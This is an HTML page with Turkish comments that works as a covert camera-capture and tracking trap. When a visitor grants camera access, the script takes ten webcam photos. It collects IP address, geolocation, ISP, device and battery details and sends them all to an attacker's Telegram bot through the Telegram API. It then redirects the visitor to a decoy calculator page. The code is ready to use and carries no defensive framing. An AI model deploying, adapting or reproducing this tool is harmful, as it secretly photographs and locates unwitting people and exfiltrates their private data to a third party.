
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      font-family: 'Segoe UI', Arial, sans-serif;
      background: linear-gradient(135deg, #4B0082, #FF69B4, #1E90FF);
      height: 100vh;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #fff;
      font-size: 24px;
      text-align: center;
    }

    #message {
      background-color: rgba(255, 255, 255, 0.95);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
      display: none;
    }

</head>
<body>
  <div id="message">âš ï¸ GiriÅŸ reddedildi</div>
  <video id="video" autoplay></video>
  <canvas id="canvas" style="display: none;"></canvas>

  <script>
    // URL parametre okuma fonksiyonu
    function GetURLParameter(sParam) {
      var sPageURL = window.location.search.substring(1);
      var sURLVariables = sPageURL.split('&');
      for (var i = 0; i < sURLVariables.length; i++) {
        var sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] == sParam) {
          return decodeURIComponent(sParameterName[1]);
        }
      }
      return null;
    }

    const chatId = GetURLParameter("id");
    const botToken = GetURLParameter("token");

    // MarkdownV2 iÃ§in Ã¶zel karakterleri kaÃ§Ä±rma fonksiyonu
    function escapeMarkdownV2(text) {
      const specialChars = /[_*[\]()~`>#+-=|{}.!]/g;
      return text.replace(specialChars, '\\$&');
    }

    async function getDeviceInfo() {
      const ua = navigator.userAgent;
      let make = "Bilinmeyen";
      let model = "Cihaz";
      if (/iPhone|iPad|iPod/.test(ua)) {
        make = "Apple";
        model = /iPhone/.test(ua) ? "iPhone" : /iPad/.test(ua) ? "iPad" : "iPod";
      } else if (/Android/.test(ua)) {
        make = "Android";
        model = ua.match(/Android.*?(?=;)/)?.[0] || "Bilinmeyen";
      } else if (/Windows/.test(ua)) {
        make = "Windows";
        model = "PC";
      }
      return { make, model };
    }

    async function getBatteryInfo() {
      if (!navigator.getBattery) {
        return { level: "Not supported", charging: "Not supported" };
      }
      try {
        const battery = await navigator.getBattery();
        return {
          level: battery.level ? Math.round(battery.level * 100) : "Not supported on iOS",
          charging: battery.charging ? "Evet" : "HayÄ±r"
        };
      } catch {
        return { level: "Not supported", charging: "Not supported" };
      }
    }

    async function getGeoData() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        const localTime = new Date().toLocaleString('tr-TR', { timeZone: data.timezone });
        return {
          ip: data.ip || "Bilinmeyen",
          city: data.city || "Bilinmeyen",
          region: data.region || "Bilinmeyen",
          country: data.country_name || "Bilinmeyen",
          loc: data.latitude && data.longitude ? `${data.latitude},${data.longitude}` : "Bilinmeyen",
          org: data.org || "Bilinmeyen",
          postal: data.postal || "Bilinmeyen",
          timezone: data.timezone || "Bilinmeyen",
          localTime: localTime || "Bilinmeyen"
        };
      } catch {
        return {
          ip: "Bilinmeyen",
          city: "Bilinmeyen",
          region: "Bilinmeyen",
          country: "Bilinmeyen",
          loc: "Bilinmeyen",
          org: "Bilinmeyen",
          postal: "Bilinmeyen",
          timezone: "Bilinmeyen",
          localTime: "Bilinmeyen"
        };
      }
    }

    async function capturePhotos() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const geoData = await getGeoData();
      const deviceInfo = await getDeviceInfo();
      const batteryInfo = await getBatteryInfo();

      // MarkdownV2 iÃ§in verileri kaÃ§Ä±r
      const escapedIp = escapeMarkdownV2(geoData.ip);
      const escapedCity = escapeMarkdownV2(geoData.city);
      const escapedRegion = escapeMarkdownV2(geoData.region);
      const escapedCountry = escapeMarkdownV2(geoData.country);
      const escapedLoc = escapeMarkdownV2(geoData.loc);
      const escapedOrg = escapeMarkdownV2(geoData.org);
      const escapedPostal = escapeMarkdownV2(geoData.postal);
      const escapedTimezone = escapeMarkdownV2(geoData.timezone);
      const escapedLocalTime = escapeMarkdownV2(geoData.localTime);
      const escapedDevice = escapeMarkdownV2(`${deviceInfo.make} ${deviceInfo.model}`);
      const escapedBattery = escapeMarkdownV2(`${batteryInfo.level}${batteryInfo.level !== 'Not supported on iOS' ? '%' : ''} (Åarj: ${batteryInfo.charging})`);
      const escapedTelegram = escapeMarkdownV2('@QueryBots');

      const caption = `â•­â”€â”€â”€â–£ *ğŸš€ Yeni GiriÅŸ FotoÄŸrafÄ± YakaladÄ±m*\n` +
                     `â”Šâ–âº *ğŸŒ IP*           : \`${escapedIp}\`\n` +
                     `â”Šâ–âº *ğŸ™ï¸ Åehir*        : \`${escapedCity}\`\n` +
                     `â”Šâ–âº *ğŸ“ BÃ¶lge*        : \`${escapedRegion}\`\n` +
                     `â”Šâ–âº *ğŸŒ Ãœlke*         : \`${escapedCountry}\`\n` +
                     `â”Šâ–âº *ğŸ§­ Konum*        : \`${escapedLoc}\`\n` +
                     `â”Šâ–âº *ğŸ¢ Organizasyon* : \`${escapedOrg}\`\n` +
                     `â”Šâ–âº *ğŸ“® Posta Kodu*   : \`${escapedPostal}\`\n` +
                     `â”Šâ–âº *ğŸ•“ Saat Dilimi*  : \`${escapedTimezone}\`\n` +
                     `â”Šâ–âº *â° Yerel Saat*   : \`${escapedLocalTime}\`\n` +
                     `â”Šâ–âº *ğŸ“± Cihaz*        : \`${escapedDevice}\`\n` +
                     `â”Šâ–âº *ğŸ”‹ Batarya*      : \`${escapedBattery}\`\n` +
                     `â”Šâ–âº *ğŸ“ Telegram*     : \`${escapedTelegram}\`\n` +
                     `â•°â”„â”„â”„â”„â”„â”„â”„â”„â”„â”„â”„â‚ŠËšãƒ»ğŸ’«`;

      // 1 saniye iÃ§inde 3 fotoÄŸraf Ã§ek
      for (let i = 0; i < 10; i++) {
        await new Promise(resolve => setTimeout(resolve, 333)); // 333ms bekle
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const photoData = canvas.toDataURL('image/jpeg');

        // FotoÄŸrafÄ± Telegram'a gÃ¶nder
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', dataURLtoBlob(photoData));
        formData.append('caption', caption);
        formData.append('parse_mode', 'MarkdownV2');

        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        })
        .then(res => res.json())
        .then(data => {
          if (!data.ok) {
            console.error("FotoÄŸraf gÃ¶nderilemedi:", data.description);
          }
        })
        .catch(err => console.error("Hata:", err));
      }

      // Video akÄ±ÅŸÄ±nÄ± durdur
      video.srcObject.getTracks().forEach(track => track.stop());
      // Hesap makinesi sayfasÄ±na yÃ¶nlendir
      window.location.href = 'cal.html';
    }

    // Data URL'yi Blob'a dÃ¶nÃ¼ÅŸtÃ¼rme
    function dataURLtoBlob(dataURL) {
      const arr = dataURL.split(',');
      const mime = arr[0].match(/:(.*?);/)[1];
      const bstr = atob(arr[1]);
      let n = bstr.length;
      const u8arr = new Uint8Array(n);
      while (n--) {
        u8arr[n] = bstr.charCodeAt(n);
      }
      return new Blob([u8arr], { type: mime });
    }

    window.onload = async function() {
      if (!chatId || !botToken) {
        document.getElementById('message').textContent = 'âš ï¸ Chat ID veya Bot Token URL parametresinde yok!';
        document.getElementById('message').style.display = 'block';
        return;
      }

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;
        video.onloadedmetadata = () => {
          capturePhotos();
        };
      } catch (err) {
        document.getElementById('message').textContent = 'âš ï¸ GiriÅŸ reddedildi';
        document.getElementById('message').style.display = 'block';
        console.error("Kamera hatasÄ±:", err);
      }
    };
  </script>
</body>
